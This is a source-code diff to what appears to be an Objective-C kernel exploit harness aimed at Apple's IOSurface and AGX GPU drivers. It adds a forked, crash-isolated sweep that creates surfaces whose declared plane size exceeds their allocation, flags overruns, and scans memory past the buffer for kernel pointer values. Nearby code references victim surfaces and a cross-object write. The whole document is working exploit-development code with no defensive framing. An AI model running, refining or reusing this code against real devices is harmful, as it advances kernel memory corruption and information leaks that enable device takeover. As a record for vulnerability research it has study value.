@@ -44,6 +44,9 @@
 #import <string.h>
 #import <signal.h>
 #import <setjmp.h>
+#import <sys/wait.h>
+#import <unistd.h>
+#import <errno.h>
 
 extern kern_return_t mach_vm_read_overwrite(vm_map_t target_task,
     mach_vm_address_t address, mach_vm_size_t size,
@@ -654,6 +657,148 @@ static void metal_cross_object_write(IOSurfaceRef surf, uint64_t agx_va, uint64_
     L(@"[METAL] done");
 }
 
+// ---- isolated geometry sweep ----
+// Each point runs in a forked child: a kernel-side abort or a fault inside the
+// mapping probe takes only the child, and the parent logs the real signal.
+
+static const uint32_t g_gsl[7] = { 4, 4, 2, 4, 4, 4, 4 };
+static const uint64_t g_gdt[7] = { 0x4000ULL, 0x4000ULL, 0x4000ULL, 0x4000ULL, 0x4000ULL, 0x4000ULL, 0x4000ULL };
+static const uint64_t g_gpl[7] = { 0x1000000ULL, 0x4000000ULL, 0x1000000ULL, 0x1000000ULL, 0x1000000ULL, 0x10000ULL, 0x10000ULL };
+static const uint64_t g_gal[7] = { 0x10000ULL, 0x10000ULL, 0x10000ULL, 0x400000ULL, 0x1000000ULL, 0x1000000ULL, 0x10000ULL };
+
+// Cheap probe: one page per step for the extent, then an 8-byte scan capped at
+// 1 MiB past the larger of plane/alloc.
+static void gd_probe(IOSurfaceRef srf, size_t j) {
+    uint8_t *base = (uint8_t *)IOSurfaceGetBaseAddress(srf);
+    if (!base) { L(@"[GD%zu] no base", j); return; }
+    size_t alloc = IOSurfaceGetAllocSize(srf);
+    uint64_t planeEnd = (uint64_t)IOSurfaceGetBytesPerRow(srf)
+                      * (uint64_t)IOSurfaceGetHeight(srf);
+
+    uint64_t last = 0;
+    for (uint64_t off = 0x1000ULL; off <= 0x800000ULL; off += 0x1000ULL) {
+        if (!probe_read1(base + off, NULL)) break;
+        last = off;
+    }
+    L(@"[GD%zu] extent alloc=0x%zx planeEnd=0x%llx lastPage=0x%llx", j, alloc,
+      (unsigned long long)planeEnd, (unsigned long long)last);
+
+    uint64_t startOff = planeEnd > alloc ? planeEnd : alloc;
+    uint64_t stop = last;
+    if (stop > startOff + 0x100000ULL) stop = startOff + 0x100000ULL;
+    if (stop < startOff) stop = startOff;
+
+    uint64_t hits = 0;
+    uint64_t off = (startOff + 7ULL) & ~7ULL;
+    for (; off + 8 <= stop; off += 8) {
+        if (!probe_read1(base + off, NULL)) break;
+        uint64_t w = rd64(base + off);
+        if ((w >> 40) == 0xffffffULL && w != 0xffffffffffffffffULL) {
+            if (hits < 8) {
+                L(@"[GD%zu] KP +0x%llx = 0x%016llx", j,
+                  (unsigned long long)off, (unsigned long long)w);
+            }
+            hits++;
+        }
+    }
+    L(@"[GD%zu] KPcand=%llu scannedTo=0x%llx", j, (unsigned long long)hits,
+      (unsigned long long)stop);
+}
+
+static void gd_point(size_t j) {
+    uint32_t slices = g_gsl[j];
+    uint64_t data = g_gdt[j], plane = g_gpl[j], alloc = g_gal[j];
+    uint64_t h = wrap_hdr(slices, data, plane);
+    L(@"[GD%zu] begin s=%u d=0x%llx h=0x%llx p=0x%llx a=0x%llx", j, slices,
+      (unsigned long long)data, (unsigned long long)h,
+      (unsigned long long)plane, (unsigned long long)alloc);
+
+    io_service_t svc = IOServiceGetMatchingService(kIOMasterPortDefault,
+                                                   IOServiceMatching("IOSurfaceRoot"));
+    if (!svc) { L(@"[GD%zu] no IOSurfaceRoot", j); _exit(3); }
+    io_connect_t conn = 0;
+    kern_return_t kr = IOServiceOpen(svc, mach_task_self(), 0, &conn);
+    IOObjectRelease(svc);
+    if (kr != KERN_SUCCESS) { L(@"[GD%zu] open=0x%x", j, kr); _exit(4); }
+
+    uint32_t sid = create_surface(conn, f1_xml3(slices, data, h, plane, alloc), "GD");
+    if (!sid) {
+        L(@"[GD%zu] REJECTED s=%u d=0x%llx p=0x%llx a=0x%llx", j, slices,
+          (unsigned long long)data, (unsigned long long)plane,
+          (unsigned long long)alloc);
+        IOServiceClose(conn);
+        _exit(0);
+    }
+
+    IOSurfaceRef srf = IOSurfaceLookup(sid);
+    size_t ca = 0;
+    if (srf) {
+        ca = IOSurfaceGetAllocSize(srf);
+        L(@"[GD%zu] ACCEPTED base=%p alloc=0x%zx plane=0x%llx", j,
+          IOSurfaceGetBaseAddress(srf), ca, (unsigned long long)plane);
+        if (plane > ca) {
+            L(@"[GD%zu] *** OVERRUN *** plane 0x%llx > alloc 0x%zx", j,
+              (unsigned long long)plane, ca);
+        } else {
+            L(@"[GD%zu] equal plane 0x%llx alloc 0x%zx", j,
+              (unsigned long long)plane, ca);
+        }
+    }
+
+    io_connect_t acb = agx_open_device();
+    if (acb) {
+        agxsel8_t gr;
+        agx_sel8(acb, 0x82, 0, sid, 1, &gr);
+        L(@"[GD%zu] span=0x%llx obj=0x%llx", j, (unsigned long long)gr.span,
+          (unsigned long long)gr.obj);
+        if (srf) {
+            L(@"[GD%zu] spanVsAlloc span=0x%llx alloc=0x%zx %s", j,
+              (unsigned long long)gr.span, ca,
+              gr.span > ca ? "*** OVERRUN ***" : "equal");
+        }
+        IOServiceClose(acb);
+    } else {
+        L(@"[GD%zu] no AGX device", j);
+    }
+
+    if (srf) {
+        gd_probe(srf, j);
+        CFRelease(srf);
+    }
+    IOServiceClose(conn);
+    _exit(0);
+}
+
+static void gd_point_isolated(size_t j) {
+    L(@"[ISO] point %zu fork", j);
+    pid_t pid = fork();
+    if (pid < 0) { L(@"[ISO] point %zu fork failed errno=%d", j, errno); return; }
+    if (pid == 0) { gd_point(j); _exit(0); }
+
+    int status = 0;
+    int waited = 0;
+    for (;;) {
+        pid_t r = waitpid(pid, &status, WNOHANG);
+        if (r == pid) break;
+        if (r < 0) { L(@"[ISO] point %zu waitpid errno=%d", j, errno); return; }
+        if (waited >= 15000) {
+            kill(pid, SIGKILL);
+            waitpid(pid, &status, 0);
+            L(@"[ISO] point %zu TIMEOUT", j);
+            return;
+        }
+        usleep(20000);
+        waited += 20;
+    }
+    if (WIFEXITED(status)) {
+        L(@"[ISO] point %zu exit=%d", j, WEXITSTATUS(status));
+    } else if (WIFSIGNALED(status)) {
+        L(@"[ISO] point %zu KILLED by signal %d", j, WTERMSIG(status));
+    } else {
+        L(@"[ISO] point %zu status=0x%x", j, status);
+    }
+}
+
 static void run(void) {
     struct utsname un;
     uname(&un);
@@ -692,47 +837,8 @@ static void run(void) {
     IOSurfaceRef ios_victims[32];
     int ivc = create_iosurface_victims(ios_victims, 32);
 
-    // ---- geometry sweep: the 32-bit check keeps wrapping to the small plane
-    //      while the per-slice data region grows; span should follow data*slices ----
-    io_connect_t acb = agx_open_device();
-    if (acb) {
-        // v7: decouple the declared plane from the allocation. In every prior
-        // sweep plane == alloc, so out+0x28 could not tell them apart.
-        static const uint32_t gsl[7] = { 4, 4, 2, 4, 4, 4, 4 };
-        static const uint64_t gdt[7] = { 0x4000ULL, 0x4000ULL, 0x4000ULL, 0x4000ULL, 0x4000ULL, 0x4000ULL, 0x4000ULL };
-        static const uint64_t gpl[7] = { 0x1000000ULL, 0x4000000ULL, 0x1000000ULL, 0x1000000ULL, 0x1000000ULL, 0x10000ULL, 0x10000ULL };
-        static const uint64_t gal[7] = { 0x10000ULL, 0x10000ULL, 0x10000ULL, 0x400000ULL, 0x1000000ULL, 0x1000000ULL, 0x10000ULL };
-        for (size_t j = 0; j < 7; j++) {
-            uint64_t h = wrap_hdr(gsl[j], gdt[j], gpl[j]);
-            uint32_t gsid = create_surface(conn, f1_xml3(gsl[j], gdt[j], h, gpl[j], gal[j]), "GD");
-            if (!gsid) {
-                L(@"[GD%zu] rejected s=%u d=0x%llx p=0x%llx", j, gsl[j],
-                  (unsigned long long)gdt[j], (unsigned long long)gpl[j]);
-                continue;
-            }
-            IOSurfaceRef gsrf = IOSurfaceLookup(gsid);
-            if (gsrf) {
-                L(@"[GD%zu] s=%u d=0x%llx h=0x%llx p=0x%llx alloc=0x%zx", j, gsl[j],
-                  (unsigned long long)gdt[j], (unsigned long long)h,
-                  (unsigned long long)gpl[j], IOSurfaceGetAllocSize(gsrf));
-                CFRelease(gsrf);
-            }
-            agxsel8_t gr;
-            agx_sel8(acb, 0x82, 0, gsid, 1, &gr);
-            L(@"[GD%zu] span=0x%llx obj=0x%llx", j, (unsigned long long)gr.span,
-              (unsigned long long)gr.obj);
-            IOSurfaceRef chk = IOSurfaceLookup(gsid);
-            if (chk) {
-                size_t ca = IOSurfaceGetAllocSize(chk);
-                L(@"[GD%zu] spanVsAlloc span=0x%llx alloc=0x%zx %s", j,
-                  (unsigned long long)gr.span, ca,
-                  gr.span > ca ? "*** OVERRUN ***" : "equal");
-                mem_probe_surface(chk, "GD", 0x4000000ULL);
-                CFRelease(chk);
-            }
-        }
-        IOServiceClose(acb);
-    }
+    // ---- geometry sweep: one forked child per point ----
+    for (size_t j = 0; j < 7; j++) gd_point_isolated(j);
     // ---- end geometry sweep ----
 
     uint64_t agx_span = 0;
